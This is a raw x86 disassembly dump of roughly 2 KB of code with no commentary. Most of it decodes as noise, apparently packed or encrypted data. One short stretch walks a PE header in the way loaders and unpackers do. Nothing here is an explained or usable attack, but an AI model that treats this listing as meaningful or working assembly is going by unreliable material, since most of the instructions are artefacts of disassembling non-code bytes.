  40f86b:	mov    ecx,0x88a45a52
  40f870:	mov    ebp,0xd5012bd4
  40f875:	ds fcompp 
  40f878:	pusha  
  40f879:	inc    edx
  40f87a:	ss jge 0x40f892
  40f87d:	test   al,0xb6
  40f87f:	int    0x49
  40f881:	jnp    0x40f825
  40f883:	pop    ebx
  40f884:	test   eax,0x17af3b7c
  40f889:	jbe    0x40f82a
  40f88b:	retf   0xfd82
  40f88e:	push   esi
  40f88f:	fisub  DWORD PTR [ebp+0x6600ecc9]
  40f895:	sbb    DWORD PTR [edx],esp
  40f897:	mov    esi,0x329ff175
  40f89c:	mov    dl,0x3d
  40f89e:	stos   DWORD PTR es:[edi],eax
  40f89f:	call   0x53b3:0x6b27c46b
  40f8a6:	sub    al,0x7c
  40f8a8:	lods   eax,DWORD PTR ds:[esi]
  40f8a9:	mov    eax,0x1f54d55b
  40f8ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8af:	push   ecx
  40f8b0:	sbb    esi,ebx
  40f8b2:	out    dx,al
  40f8b3:	pop    edx
  40f8b4:	outs   dx,BYTE PTR ds:[esi]
  40f8b5:	in     al,0x8a
  40f8b7:	mov    DWORD PTR ds:0x99205c05,esi
  40f8bd:	not    dh
  40f8bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8c0:	cs jle 0x40f876
  40f8c3:	aaa    
  40f8c4:	pop    edi
  40f8c5:	cdq    
  40f8c6:	mov    ebx,0x5a982d40
  40f8cb:	mov    ds:0xcf3c7511,al
  40f8d0:	add    dl,bh
  40f8d2:	cli    
  40f8d3:	mov    esp,0xa6c46e7b
  40f8d8:	add    DWORD PTR [esi],ebx
  40f8da:	cmc    
  40f8db:	dec    eax
  40f8dc:	mov    ah,0x1e
  40f8de:	bnd jbe 0x40f8a4
  40f8e1:	mov    al,ds:0xc2006582
  40f8e6:	mov    esp,0xfd688277
  40f8eb:	ins    BYTE PTR es:[edi],dx
  40f8ec:	jo     0x40f910
  40f8ee:	cmp    DWORD PTR [ecx+0x1e34210b],ecx
  40f8f4:	adc    eax,0x6135434d
  40f8f9:	aas    
  40f8fa:	jecxz  0x40f912
  40f8fc:	xchg   ebp,eax
  40f8fd:	inc    ebx
  40f8fe:	into   
  40f8ff:	(bad)  
  40f900:	outs   dx,BYTE PTR ds:[esi]
  40f901:	mov    dl,0x7c
  40f903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f904:	jge    0x40f8ac
  40f906:	stos   DWORD PTR es:[edi],eax
  40f907:	mov    al,ds:0xcb62da3c
  40f90c:	or     eax,0xf242ea99
  40f911:	pop    ebx
  40f912:	addr16 inc ebp
  40f914:	(bad)  
  40f915:	fiadd  DWORD PTR [esi-0x635e0691]
  40f91b:	out    dx,al
  40f91c:	mov    WORD PTR [ecx],es
  40f91e:	sbb    al,0xc7
  40f920:	gs cmp eax,0x4c2dffcc
  40f926:	xor    BYTE PTR [ebx-0x7a],bl
  40f929:	xlat   BYTE PTR ds:[ebx]
  40f92b:	(bad)  
  40f92d:	inc    ecx
  40f92e:	pop    ss
  40f92f:	fwait
  40f930:	and    eax,0x5af7ec57
  40f935:	ds add ah,bh
  40f938:	dec    dx
  40f93a:	fidiv  WORD PTR [esi]
  40f93c:	js     0x40f8f4
  40f93e:	call   FWORD PTR [edi-0x21]
  40f941:	out    dx,eax
  40f942:	inc    edi
  40f943:	repz sbb eax,0xd9f9187d
  40f949:	adc    al,0x10
  40f94b:	js     0x40f918
  40f94d:	gs and edx,ecx
  40f950:	pop    edi
  40f951:	fs xchg esp,eax
  40f953:	mov    cl,0xd2
  40f955:	fsub   st(7),st
  40f957:	repz mov WORD PTR [esi+0x3acdabbe],fs
  40f95e:	cli    
  40f95f:	mov    edi,0x3a7104a9
  40f964:	mov    ebp,0x6fbf104d
  40f969:	or     al,0xa0
  40f96b:	repz jle 0x40f99d
  40f96e:	adc    eax,0x681a3bb
  40f973:	mov    al,ds:0x2046d361
  40f978:	inc    ebp
  40f979:	push   edi
  40f97a:	pushf  
  40f97b:	mov    ebp,0x2ca8a97a
  40f980:	into   
  40f981:	test   eax,0x1456bdb8
  40f986:	imul   edi,DWORD PTR [esi-0x51],0xaa89a191
  40f98d:	or     DWORD PTR [ebp+ecx*4-0x6cc200bb],esi
  40f994:	ins    BYTE PTR es:[edi],dx
  40f995:	push   DWORD PTR [esi+0x4859dc76]
  40f99b:	push   eax
  40f99c:	xchg   ebx,eax
  40f99d:	dec    ebp
  40f99e:	sbb    bh,bh
  40f9a0:	stos   DWORD PTR es:[edi],eax
  40f9a1:	fdiv   QWORD PTR [eax-0x37]
  40f9a4:	push   ds
  40f9a5:	repnz xchg eax,esi
  40f9a8:	jle    0x40f9a3
  40f9aa:	lea    edx,[eax]
  40f9ac:	push   esi
  40f9ad:	fmulp  st(5),st
  40f9af:	fistp  WORD PTR [esi]
  40f9b1:	daa    
  40f9b2:	loop   0x40f943
  40f9b4:	pop    esi
  40f9b5:	ss mov al,0x52
  40f9b8:	sub    DWORD PTR [esi+esi*2+0x42],edx
  40f9bc:	ret    
  40f9bd:	test   eax,0x51400f9c
  40f9c2:	addr16 push ebx
  40f9c4:	inc    eax
  40f9c5:	mov    ecx,0xde7bb77d
  40f9ca:	cmc    
  40f9cb:	or     edx,DWORD PTR [ecx+0x28]
  40f9ce:	dec    ebx
  40f9cf:	push   ecx
  40f9d0:	xor    al,0x17
  40f9d2:	not    DWORD PTR [ebx]
  40f9d4:	mov    eax,ds:0xcb795d24
  40f9d9:	and    eax,0x411e408b
  40f9de:	push   esi
  40f9df:	xchg   esp,eax
  40f9e0:	mov    bh,0x2d
  40f9e2:	inc    eax
  40f9e3:	dec    edx
  40f9e4:	adc    al,0xc7
  40f9e6:	pop    edx
  40f9e7:	sub    eax,0x9f138c90
  40f9ec:	ss inc ebx
  40f9ee:	jle    0x40f9a1
  40f9f0:	lods   eax,DWORD PTR ds:[esi]
  40f9f1:	les    edi,FWORD PTR [ecx-0xf2d416b]
  40f9f7:	out    0x33,eax
  40f9f9:	cmp    edx,DWORD PTR [esi]
  40f9fb:	jmp    0x8cad:0xef784575
  40fa02:	mov    dl,0x66
  40fa04:	adc    esi,DWORD PTR [eax]
  40fa06:	xor    BYTE PTR [ecx],dh
  40fa08:	pop    ss
  40fa09:	sub    DWORD PTR [ecx-0x70],ebp
  40fa0c:	div    ah
  40fa0e:	push   0xffffffcf
  40fa10:	sbb    eax,ebp
  40fa12:	mov    eax,0x84368a9b
  40fa17:	das    
  40fa18:	ror    ebx,cl
  40fa1a:	add    eax,0xaaeeeb97
  40fa1f:	fnstenv [ebx-0x1563037b]
  40fa25:	mov    bl,0x90
  40fa27:	popf   
  40fa28:	sbb    ecx,ebp
  40fa2a:	call   0x35bd:0xfbeb0585
  40fa31:	mov    ah,0x5d
  40fa33:	outs   dx,DWORD PTR ds:[esi]
  40fa34:	ret    0x97d1
  40fa37:	mov    edx,0x62ed5d43
  40fa3c:	ja     0x40fa76
  40fa3e:	adc    eax,0x91f5fd0a
  40fa43:	in     al,0x12
  40fa45:	inc    ebp
  40fa46:	sub    ebp,DWORD PTR [ebx+0x6c]
  40fa49:	push   ebx
  40fa4a:	in     eax,0x9c
  40fa4c:	push   edx
  40fa4d:	stc    
  40fa4e:	call   0x7f60:0xb630c020
  40fa55:	pushf  
  40fa56:	cmp    edx,0xa1e7cd3b
  40fa5c:	mov    ecx,0x72bba8bd
  40fa61:	ficom  DWORD PTR [ebx]
  40fa63:	(bad)  
  40fa64:	mov    eax,ds:0x9ba0ef20
  40fa69:	leave  
  40fa6a:	add    eax,0x529381da
  40fa6f:	outs   dx,DWORD PTR ds:[esi]
  40fa70:	test   ch,al
  40fa72:	jns    0x40fa77
  40fa74:	pushf  
  40fa75:	inc    ecx
  40fa76:	in     al,0x3b
  40fa78:	push   ecx
  40fa79:	sub    cl,BYTE PTR [ebx-0x789a5d1d]
  40fa7f:	fnstenv [ebp-0x1848ad4d]
  40fa85:	fbstp  TBYTE PTR [ecx+edi*8+0x6642d381]
  40fa8c:	test   bl,0x9a
  40fa8f:	repnz xchg edx,eax
  40fa91:	cmc    
  40fa92:	mov    ch,0x6b
  40fa94:	fldenv [edi-0x57ee0232]
  40fa9a:	sub    eax,ebp
  40fa9c:	jecxz  0x40fa30
  40fa9e:	add    dl,BYTE PTR [edx+0x9]
  40faa1:	(bad)  
  40faa2:	push   ecx
  40faa3:	jb     0x40fa3e
  40faa5:	repz fsubr DWORD PTR ds:0x82ce558d
  40faac:	int3   
  40faad:	mov    bh,0xf7
  40faaf:	stc    
  40fab0:	adc    ch,BYTE PTR [ebx+0x443c594f]
  40fab6:	inc    ebp
  40fab7:	jbe    0x40fabe
  40fab9:	inc    edx
  40faba:	mov    edx,esp
  40fabc:	pop    ebx
  40fabd:	outs   dx,BYTE PTR ds:[esi]
  40fabe:	shr    BYTE PTR [ebx],0x91
  40fac1:	sbb    ecx,DWORD PTR [ecx]
  40fac3:	mov    esp,0x5bb0d1d2
  40fac8:	das    
  40fac9:	dec    edx
  40faca:	or     DWORD PTR [ebx-0x343506c7],edx
  40fad0:	mov    ah,0x50
  40fad2:	test   BYTE PTR [esi],bh
  40fad4:	sbb    ah,ch
  40fad6:	jns    0x40facd
  40fad8:	les    esi,FWORD PTR [ecx-0x7b43b382]
  40fade:	into   
  40fadf:	out    dx,al
  40fae0:	std    
  40fae1:	sbb    eax,0xadd7d38c
  40fae6:	add    al,0x9e
  40fae8:	jns    0x40faff
  40faea:	dec    edx
  40faeb:	adc    eax,DWORD PTR [edx]
  40faed:	mov    ch,0x6c
  40faef:	push   edi
  40faf0:	lods   eax,DWORD PTR ds:[esi]
  40faf1:	mov    edi,edx
  40faf3:	jmp    0x40fb41
  40faf5:	add    eax,0xbaa2b758
  40fafa:	xor    DWORD PTR [bx+si-0x50],edi
  40fafe:	das    
  40faff:	pop    ss
  40fb00:	out    0xa2,al
  40fb02:	pop    esp
  40fb03:	test   ch,ch
  40fb05:	mov    dh,0x60
  40fb07:	inc    esp
  40fb08:	adc    ch,BYTE PTR [ebx-0x359ba4e6]
  40fb0e:	sub    al,0x9e
  40fb10:	leave  
  40fb11:	mov    ch,BYTE PTR [eax-0x27]
  40fb14:	call   0x997c24da
  40fb19:	adc    al,0x8c
  40fb1b:	daa    
  40fb1c:	out    dx,eax
  40fb1d:	cmp    ebp,DWORD PTR [esi+0x76]
  40fb20:	jl     0x40fb36
  40fb22:	xor    bl,BYTE PTR [edi]
  40fb24:	mov    ecx,DWORD PTR [edx]
  40fb26:	mov    ss,WORD PTR [ebx+0xa]
  40fb29:	jbe    0x40fb63
  40fb2b:	inc    edx
  40fb2c:	dec    esi
  40fb2d:	gs iret 
  40fb2f:	and    DWORD PTR [ebx],esi
  40fb31:	xchg   DWORD PTR [edx-0x71852c8],esi
  40fb37:	inc    DWORD PTR [eax-0x46]
  40fb3a:	lock loopne 0x40fb72
  40fb3d:	test   eax,0x6f9aa1b
  40fb42:	popf   
  40fb43:	std    
  40fb44:	mov    ecx,edx
  40fb46:	lahf   
  40fb47:	inc    esi
  40fb48:	jnp    0x40fbbe
  40fb4a:	(bad)  
  40fb4b:	inc    BYTE PTR [esp+esi*1-0x40094acb]
  40fb52:	mov    cl,0x5f
  40fb54:	fnstsw WORD PTR [esi+0x3eb065dc]
  40fb5a:	sahf   
  40fb5b:	inc    esi
  40fb5c:	sub    DWORD PTR [eax],esp
  40fb5e:	div    BYTE PTR [esi-0x5d]
  40fb61:	dec    ecx
  40fb62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb63:	mov    ds:0x840bffe3,al
  40fb68:	popf   
  40fb69:	imul   edi,DWORD PTR [ecx+0x23],0xffffffdf
  40fb6d:	ins    DWORD PTR es:[edi],dx
  40fb6e:	stos   DWORD PTR es:[edi],eax
  40fb6f:	jb     0x40fb42
  40fb71:	sub    DWORD PTR [ebx-0x69],0xf5fc94f2
  40fb78:	std    
  40fb79:	div    bh
  40fb7b:	test   al,0xb9
  40fb7d:	sub    eax,DWORD PTR [edi+esi*1-0x1d1e9723]
  40fb84:	nop
  40fb85:	loopne 0x40fbc8
  40fb87:	imul   esi,DWORD PTR [ebx+0x263400bc],0xaa3ffd92
  40fb91:	cli    
  40fb92:	pop    ecx
  40fb93:	div    BYTE PTR ds:[ecx]
  40fb96:	push   ebp
  40fb97:	xchg   edx,eax
  40fb98:	adc    dh,dl
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e224
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x8d
  40fbb3:	ja     0x40fb8b
  40fbb5:	sbb    DWORD PTR [edx-0x5c8f8f4f],eax
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fb5f
  40fbbf:	push   cs
  40fbc0:	mov    ?,WORD PTR [bp+0x76]
  40fbc4:	stos   DWORD PTR es:[edi],eax
  40fbc5:	xor    DWORD PTR [edx+0x41bc803f],ebx
  40fbcb:	test   DWORD PTR [edx+0x5623edab],0x3a0c8c32
  40fbd5:	leave  
  40fbd6:	lods   eax,DWORD PTR ds:[esi]
  40fbd7:	and    DWORD PTR [edx],edx
  40fbd9:	push   0x52d7bbb7
  40fbde:	and    ecx,DWORD PTR ds:0xe68664e7
  40fbe4:	(bad)  
  40fbe5:	push   ecx
  40fbe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbe7:	jb     0x40fb7d
  40fbe9:	mov    edi,0x90f836f5
  40fbee:	test   BYTE PTR [edx],cl
  40fbf0:	je     0x40fc1c
  40fbf2:	mov    ah,0x3e
  40fbf4:	adc    ch,BYTE PTR [esi]
  40fbf6:	inc    esi
  40fbf7:	xchg   ebp,eax
  40fbf8:	jge    0x40fbbd
  40fbfa:	jno    0x40fc3b
  40fbfc:	jbe    0x40fb9c
  40fbfe:	in     al,dx
  40fbff:	pop    ebp
  40fc00:	out    0xfd,eax
  40fc02:	jbe    0x40fbee
  40fc04:	dec    esi
  40fc05:	call   0xe75baa35
  40fc0a:	adc    ebp,DWORD PTR [edx]
  40fc0c:	fist   WORD PTR [ebx+0x345a2242]
  40fc12:	cli    
  40fc13:	aad    0xb2
  40fc15:	out    0x79,al
  40fc17:	pop    ds
  40fc18:	sbb    bh,0x91
  40fc1b:	push   ebx
  40fc1c:	data16 (bad) [edx-0x6e9162fe]
  40fc23:	sbb    edi,DWORD PTR [edi+0xdc6dfa5]
  40fc29:	adc    ah,BYTE PTR [esi]
  40fc2b:	stc    
  40fc2c:	ins    BYTE PTR es:[edi],dx
  40fc2d:	(bad)  
  40fc2e:	(bad)  
  40fc30:	inc    BYTE PTR [edx]
  40fc32:	pop    ecx
  40fc33:	pop    eax
  40fc34:	out    0x67,al
  40fc36:	or     ch,BYTE PTR ss:0xbce0fbf5
  40fc3d:	mov    ch,0x9
  40fc3f:	add    al,0xbf
  40fc41:	das    
  40fc42:	dec    ecx
  40fc43:	and    ecx,DWORD PTR [edi+0x5ba18c08]
  40fc49:	mov    bh,0x97
  40fc4b:	mov    bl,0x51
  40fc4d:	out    dx,eax
  40fc4e:	(bad)  
  40fc4f:	repz xchg ebx,eax
  40fc51:	push   0x3e
  40fc53:	push   0xcdf33374
  40fc58:	xlat   BYTE PTR ds:[ebx]
  40fc59:	fmul   QWORD PTR [ebp+ebx*4-0x40]
  40fc5d:	ins    DWORD PTR es:[edi],dx
  40fc5e:	adc    edx,DWORD PTR [esi*8-0x4b406437]
  40fc65:	xlat   BYTE PTR ds:[ebx]
  40fc66:	or     DWORD PTR [edi-0xb759b19],edx
  40fc6c:	xlat   BYTE PTR ds:[ebx]
  40fc6d:	and    eax,0xdb6c83d6
  40fc72:	add    bh,BYTE PTR [edi+edi*4-0x79]
  40fc76:	dec    ebp
  40fc77:	xchg   ebx,eax
  40fc78:	enter  0x8ecc,0xa7
  40fc7c:	xor    eax,0xc1ef3309
  40fc81:	adc    bl,BYTE PTR [ebx-0x1e]
  40fc84:	xchg   ebx,eax
  40fc85:	sub    DWORD PTR [esi-0x67b9722f],esp
  40fc8b:	sub    al,0x2c
  40fc8d:	repz inc ebx
  40fc8f:	adc    ebx,ecx
  40fc91:	cld    
  40fc92:	in     eax,dx
  40fc93:	xor    eax,0x66b95c48
  40fc98:	stc    
  40fc99:	out    0x5b,eax
  40fc9b:	mov    esi,0xf25b0208
  40fca0:	push   ebx
  40fca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fca2:	adc    dl,BYTE PTR [ecx-0x231ee78e]
  40fca8:	mov    al,0x10
  40fcaa:	and    eax,0xcba0a4
  40fcaf:	cdq    
  40fcb0:	push   0xa1d297a5
  40fcb5:	ja     0x40fce8
  40fcb7:	sbb    BYTE PTR [ebx+ecx*1+0x33],al
  40fcbb:	int3   
  40fcbc:	lock and eax,0x376aaeac
  40fcc2:	cs xchg ecx,eax
  40fcc4:	stos   DWORD PTR es:[edi],eax
  40fcc5:	dec    ecx
  40fcc6:	and    DWORD PTR [ebx-0x1],edi
  40fcc9:	aaa    
  40fcca:	in     al,0x62
  40fccc:	dec    edx
  40fccd:	lods   eax,DWORD PTR ds:[esi]
  40fcce:	inc    edx
  40fccf:	mov    eax,0xf6da0114
  40fcd4:	mov    ebp,0x5e791bcc
  40fcd9:	mov    edx,0x6bdc81b7
  40fcde:	retf   0xb6c3
  40fce1:	sahf   
  40fce2:	sub    DWORD PTR [ebx+0x28],ebp
  40fce5:	add    BYTE PTR [edi],0x6c
  40fce8:	inc    edi
  40fce9:	jae    0x40fd06
  40fceb:	push   esp
  40fcec:	mov    WORD PTR ds:0x397db6bd,es
  40fcf2:	outs   dx,DWORD PTR ds:[esi]
  40fcf3:	and    al,cl
  40fcf5:	adc    al,0x61
  40fcf7:	(bad)  
  40fcf8:	mov    bh,0x79
  40fcfa:	push   eax
  40fcfb:	pop    ss
  40fcfc:	dec    ebx
  40fcfd:	mov    eax,ds:0xc12fc778
  40fd02:	leave  
  40fd03:	iret   
  40fd04:	popf   
  40fd05:	sahf   
  40fd06:	retf   
  40fd07:	mov    DWORD PTR [esi+0x44],esp
  40fd0a:	pusha  
  40fd0b:	test   DWORD PTR [eax-0x2b],0xa459ef06
  40fd12:	std    
  40fd13:	ds mov eax,0xd10facd2
  40fd19:	add    eax,0xedef56c0
  40fd1e:	xor    dl,BYTE PTR [esi+edi*2]
  40fd21:	sub    edi,edi
  40fd23:	ss mov ebx,0x4223408b
  40fd29:	aam    0x16
  40fd2b:	xchg   ebp,eax
  40fd2c:	or     DWORD PTR ds:0x1d06b624,edx
  40fd32:	cmc    
  40fd33:	bound  eax,QWORD PTR [eax+esi*1+0x3d269038]
  40fd3a:	push   edx
  40fd3b:	or     al,BYTE PTR [esi+ebx*4+0x7e]
  40fd3f:	xchg   ebp,eax
  40fd40:	mov    edx,0xc78969ca
  40fd45:	xor    al,0x6a
  40fd47:	pop    ss
  40fd48:	push   esi
  40fd49:	mov    eax,DWORD PTR [edi]
  40fd4b:	push   0x7a119dfa
  40fd50:	and    ah,bh
  40fd52:	inc    esp
  40fd53:	and    ah,BYTE PTR [esi]
  40fd55:	mov    ss,WORD PTR [ebx+0x31]
  40fd58:	in     al,dx
  40fd59:	xchg   ebx,eax
  40fd5a:	fldcw  WORD PTR [ebp+0x12086a0]
  40fd60:	aam    0x10
  40fd62:	dec    edi
  40fd63:	pop    ebp
  40fd64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd65:	and    ebx,ecx
  40fd67:	pushf  
  40fd68:	mov    bl,BYTE PTR [ebp-0x3f95fe61]
  40fd6e:	push   es
  40fd6f:	mov    ch,0xd7
  40fd71:	mov    ebx,0xf0e9b585
  40fd76:	add    al,0xa
  40fd78:	mov    ds:0xb16334b8,al
  40fd7d:	mov    DWORD PTR [eax-0x1c60305b],0x400f51df
  40fd87:	je     0x40fd90
  40fd89:	adc    eax,0x20a15e85
  40fd8e:	and    al,0x32
  40fd90:	ret    0x4c77
  40fd93:	mov    ch,0x4f
  40fd95:	clc    
  40fd96:	xor    ecx,DWORD PTR [ebx+ebx*1-0x4f0d2430]
  40fd9d:	dec    ebp
  40fd9e:	and    eax,0x69ae15af
  40fda3:	nop
  40fda4:	adc    eax,0x7efb69b6
  40fda9:	ins    BYTE PTR es:[edi],dx
  40fdaa:	mov    esp,0x48e0aaa0
  40fdaf:	stos   DWORD PTR es:[edi],eax
  40fdb0:	push   es
  40fdb1:	fwait
  40fdb2:	enter  0xf56e,0x3
  40fdb6:	jb     0x40fdfb
  40fdb8:	inc    edi
  40fdb9:	xchg   edi,eax
  40fdba:	push   eax
  40fdbb:	jbe    0x40fd7c
  40fdbd:	cdq    
  40fdbe:	std    
  40fdbf:	mov    cl,0xc3
  40fdc1:	jle    0x40fdee
  40fdc3:	(bad)  
  40fdc4:	popf   
  40fdc5:	ret    0x16af
  40fdc8:	bound  ebp,QWORD PTR [edx+0x2c]
  40fdcb:	xor    ch,BYTE PTR [ebx]
  40fdcd:	fpatan 
  40fdcf:	xor    ah,al
  40fdd1:	bound  ebp,QWORD PTR [edx+ebp*1]
  40fdd4:	adc    al,0x3e
  40fdd6:	jge    0x40fe15
  40fdd8:	pop    edx
  40fdd9:	push   edx
  40fdda:	jl     0x40fdd9
  40fddc:	ins    DWORD PTR es:[edi],dx
  40fddd:	iret   
  40fdde:	mov    fs,WORD PTR [ebx-0x71]
  40fde1:	adc    BYTE PTR [ebx+0x6d],al
  40fde4:	fsubr  QWORD PTR [ebx-0x4796480b]
  40fdea:	and    eax,0xc30c9856
  40fdef:	daa    
  40fdf0:	je     0x40fdf9
  40fdf2:	cld    
  40fdf3:	aad    0xe0
  40fdf5:	popf   
  40fdf6:	cmp    bl,BYTE PTR [edx-0x41]
  40fdf9:	add    DWORD PTR [ebx+0x2],ebp
  40fdfc:	jmp    0xc5668a7b
  40fe01:	jo     0x40fe77
  40fe03:	push   ebp
  40fe04:	(bad)  
  40fe05:	and    BYTE PTR [ebp+0x7a],dh
  40fe08:	jge    0x40fe3e
  40fe0a:	test   bh,ch
  40fe0c:	ja     0x40fdc5
  40fe0e:	dec    esi
  40fe0f:	jnp    0x40fda2
  40fe11:	push   ebp
  40fe12:	mov    esi,0x7f2a0962
  40fe17:	inc    ebx
  40fe18:	inc    edx
  40fe19:	jne    0x40fdb6
  40fe1b:	cmp    eax,0xdb8df0ce
  40fe20:	or     DWORD PTR [eax-0x77],0x71e578f3
  40fe27:	cs pop ebp
  40fe29:	loop   0x40fe11
  40fe2b:	mov    eax,0xb0cd104e
  40fe30:	into   
  40fe31:	mov    ebp,0x180b4d1a
  40fe36:	outs   dx,BYTE PTR ds:[esi]
  40fe37:	cld    
  40fe38:	arpl   sp,bp
  40fe3a:	test   DWORD PTR [ebx+0x45f5d0ac],ebp
  40fe40:	rol    DWORD PTR ds:0xb4a91406,cl
  40fe46:	bnd ret 
  40fe48:	pop    ss
  40fe49:	scas   eax,DWORD PTR es:[edi]
  40fe4a:	push   ebp
  40fe4b:	fxch   st(1)
  40fe4d:	lds    ebx,FWORD PTR [edi]
  40fe4f:	mul    DWORD PTR [ebp+0x48051893]
  40fe55:	aam    0xfe
  40fe57:	sbb    eax,0x62debb3d
  40fe5c:	mov    edx,0x4673d226
  40fe61:	sub    BYTE PTR [eax+0x67],ch
  40fe64:	out    dx,al
  40fe65:	fmul   st(2),st
  40fe67:	mov    ds:0x489b7285,eax
  40fe6c:	xchg   esi,eax
  40fe6d:	enter  0x7185,0x94
  40fe71:	push   ebp
  40fe72:	mov    ds:0x68f20676,eax
  40fe77:	loopne 0x40fe81
  40fe79:	and    eax,0x3a766821
  40fe7e:	(bad)  
  40fe7f:	fiadd  WORD PTR [ecx+eax*2+0x62]
  40fe83:	push   0x14
  40fe85:	xchg   ecx,eax
  40fe86:	jns    0x40fe2a
  40fe88:	sbb    eax,0xb8a8e89d
  40fe8d:	leave  
  40fe8e:	ja     0x40fe77
  40fe90:	shl    dh,1
  40fe92:	sti    
  40fe93:	call   0x22d5a8a8
  40fe98:	retf   
  40fe99:	cli    
  40fe9a:	adc    ebp,DWORD PTR [edx+0x10e5c5e]
  40fea0:	fisubr DWORD PTR [esp+ecx*2+0x3b]
  40fea4:	shr    ah,cl
  40fea6:	jge    0x40fe92
  40fea8:	dec    ecx
  40fea9:	dec    ebp
  40feaa:	jno    0x40fede
  40feac:	ror    BYTE PTR [edx-0x68],1
  40feaf:	loopne 0x40fe74
  40feb1:	mov    edx,0x6cf1235a
  40feb6:	mov    al,ds:0xbd2f29dd
  40febb:	mov    esp,0xd633706d
  40fec0:	xor    BYTE PTR [ebx-0x68],cl
  40fec3:	xchg   edi,eax
  40fec4:	mov    DWORD PTR [eax+0x5c1e0a3d],ebp
  40feca:	push   esp
  40fecb:	mov    esp,0xbd038597
  40fed0:	sub    al,0x74
  40fed2:	push   ss
  40fed3:	repnz imul ebp,DWORD PTR [ecx+edx*4-0x129e26bb],0x5d93eacc
  40fedf:	jae    0x40fe66
  40fee1:	cli    
  40fee2:	daa    
  40fee3:	sbb    DWORD PTR [ebp-0x7],esp
  40fee6:	adc    eax,0x5979c627
  40feeb:	mov    WORD PTR [esi+0x4a],?
  40feee:	xor    BYTE PTR [edx],bh
  40fef0:	(bad)  
  40fef1:	fiadd  DWORD PTR [eax]
  40fef3:	xchg   ebx,eax
  40fef4:	push   edx
  40fef5:	push   edi
  40fef6:	fnstenv [edx-0x54]
  40fef9:	inc    edi
  40fefa:	es ins DWORD PTR es:[edi],dx
  40fefc:	aas    
  40fefd:	push   ds
  40fefe:	add    esi,ebp
  40ff00:	lock mov dh,0xfe
  40ff03:	bound  ecx,QWORD PTR [ebx+0x33533d35]
  40ff09:	jo     0x40ff2a
  40ff0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff0c:	xchg   esp,eax
  40ff0d:	push   ebx
  40ff0e:	ds scas al,BYTE PTR es:[edi]
  40ff10:	ja     0x40feba
  40ff12:	lea    esp,[edx-0x12]
  40ff15:	scas   eax,DWORD PTR es:[edi]
  40ff16:	js     0x40feda
  40ff18:	stos   BYTE PTR es:[edi],al
  40ff19:	cmc    
  40ff1a:	ja     0x40fed9
  40ff1c:	rcl    eax,0xbc
  40ff1f:	jle    0x40ff15
  40ff21:	pop    ebp
  40ff22:	stc    
  40ff23:	rcr    ah,0x7d
  40ff26:	inc    edi
  40ff27:	pop    DWORD PTR [ebp+0x4f10f571]
  40ff2d:	sahf   
  40ff2e:	in     al,0x39
  40ff30:	cmp    DWORD PTR [edi+0x37b2336c],edi
  40ff36:	pop    ebx
  40ff37:	xchg   BYTE PTR [ecx+0x449928c0],bl
  40ff3d:	sti    
  40ff3e:	dec    edx
  40ff3f:	xor    edx,eax
  40ff41:	in     al,0x20
  40ff43:	mov    edi,0x377a675c
  40ff48:	dec    ecx
  40ff49:	fbstp  TBYTE PTR [esi-0x5130389]
  40ff4f:	loopne 0x40ff14
  40ff51:	fisub  DWORD PTR [esi]
  40ff53:	das    
  40ff54:	daa    
  40ff55:	fimul  DWORD PTR [edx+0x2b9c04f6]
  40ff5b:	xor    eax,0xd22b5768
  40ff60:	mov    esi,0x8dfe24af
  40ff65:	sbb    edx,edi
  40ff67:	or     eax,DWORD PTR [esi+0x45c70c04]
  40ff6d:	cld    
  40ff6e:	xor    DWORD PTR [ebp+0x458bf89c],eax
  40ff74:	or     BYTE PTR [edx+0x3405c700],cl
  40ff7a:	loop   0x40ffbe
  40ff7c:	add    BYTE PTR [edx],bh
  40ff7e:	cmp    al,BYTE PTR [eax]
  40ff80:	add    BYTE PTR [edi+esi*1],al
  40ff83:	xor    DWORD PTR ds:0x42e7f7,0x42fe7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fdd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fe76
  40ffaa:	and    edx,DWORD PTR ds:0x42e7fb
  40ffb0:	mov    DWORD PTR ds:0x42fe76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e803,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	ds addr16 pop ds
  40ffdf:	ins    BYTE PTR es:[edi],dx
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x40ff9b
  40ffe9:	(bad)  
  40ffea:	xchg   edi,eax
  40ffeb:	mov    ebx,ebx
  40ffed:	hlt    
  40ffee:	cmp    dl,dh
  40fff0:	jne    0x410059
  40fff2:	retf   0x68af
  40fff5:	and    DWORD PTR [edx],ebp
  40fff7:	repz push ecx
  40fff9:	(bad)  
  40fffa:	sub    BYTE PTR [edi+0x1b00872e],bh
  410000:	test   esi,esp
  410002:	and    edi,DWORD PTR [esi+esi*2]
  410005:	sar    BYTE PTR [ecx+0xf8bf640],cl
  41000b:	jmp    0x410001
  41000d:	je     0x40ffb7
  41000f:	inc    edx
  410010:	arpl   WORD PTR [ebx+0x2db2e17b],bx
  410016:	aad    0x4d
  410018:	dec    ecx
  410019:	and    esp,DWORD PTR [edx]
  41001b:	adc    esi,ebx
